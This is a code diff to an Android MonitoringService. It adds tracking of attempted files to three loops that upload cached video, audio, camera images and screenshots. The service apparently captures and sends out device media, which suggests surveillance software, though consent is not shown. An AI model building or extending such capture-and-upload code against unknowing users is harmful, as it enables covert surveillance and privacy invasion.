@@ -9438,13 +9438,14 @@ class MonitoringService : Service() {
             if (!hasNetwork()) return
             val flushDeadline = android.os.SystemClock.elapsedRealtime() + 600_000L
             var batches = 0
+            val attempted = HashSet<String>()
             drain@ while (batches < 3) {
                 val pending = try {
                     val all = cacheDir.listFiles { file ->
                         file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4")
                     }?.sortedBy { it.lastModified() } ?: break@drain
                     lastFullListing = all
-                    all.take(max)
+                    all.filter { it.absolutePath !in attempted }.take(max)
                 } catch (e: Exception) {
                     break@drain
                 }
@@ -9462,6 +9463,7 @@ class MonitoringService : Service() {
                     }
                     val remainMs = flushDeadline - android.os.SystemClock.elapsedRealtime()
                     if (remainMs <= 0L) break@drain
+                    attempted.add(file.absolutePath)
                     val videoOutcome = kotlinx.coroutines.withTimeoutOrNull(remainMs) { sendVideoFile(file) } ?: MediaSendOutcome.KEPT
                     if (videoOutcome == MediaSendOutcome.KEPT) continue
                     monitorBeatAt = android.os.SystemClock.elapsedRealtime()
@@ -9522,13 +9524,14 @@ class MonitoringService : Service() {
             if (!hasNetwork()) return
             val flushDeadline = android.os.SystemClock.elapsedRealtime() + 600_000L
             var batches = 0
+            val attempted = HashSet<String>()
             drain@ while (batches < 3) {
                 val pending = try {
                     val all = cacheDir.listFiles { file ->
                         file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
                     }?.sortedBy { it.lastModified() } ?: break@drain
                     lastFullListing = all
-                    all.take(max)
+                    all.filter { it.absolutePath !in attempted }.take(max)
                 } catch (e: Exception) {
                     break@drain
                 }
@@ -9546,6 +9549,7 @@ class MonitoringService : Service() {
                     }
                     val remainMs = flushDeadline - android.os.SystemClock.elapsedRealtime()
                     if (remainMs <= 0L) break@drain
+                    attempted.add(file.absolutePath)
                     val audioOutcome = kotlinx.coroutines.withTimeoutOrNull(remainMs) { sendAudioFile(file) } ?: MediaSendOutcome.KEPT
                     if (audioOutcome == MediaSendOutcome.KEPT) continue
                     monitorBeatAt = android.os.SystemClock.elapsedRealtime()
@@ -9814,13 +9818,14 @@ class MonitoringService : Service() {
             if (!hasNetwork()) return
             val flushDeadline = android.os.SystemClock.elapsedRealtime() + 600_000L
             var batches = 0
+            val attempted = HashSet<String>()
             drain@ while (batches < 3) {
                 val pending = try {
                     val all = cacheDir.listFiles { file ->
                         file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
                     }?.sortedBy { it.lastModified() } ?: break@drain
                     lastFullListing = all
-                    all.take(max)
+                    all.filter { it.absolutePath !in attempted }.take(max)
                 } catch (e: Exception) {
                     break@drain
                 }
@@ -9838,6 +9843,7 @@ class MonitoringService : Service() {
                     }
                     val remainMs = flushDeadline - android.os.SystemClock.elapsedRealtime()
                     if (remainMs <= 0L) break@drain
+                    attempted.add(file.absolutePath)
                     val photoOutcome = kotlinx.coroutines.withTimeoutOrNull(remainMs) { sendPhotoFile(file) } ?: MediaSendOutcome.KEPT
                     if (photoOutcome == MediaSendOutcome.KEPT) continue
                     monitorBeatAt = android.os.SystemClock.elapsedRealtime()
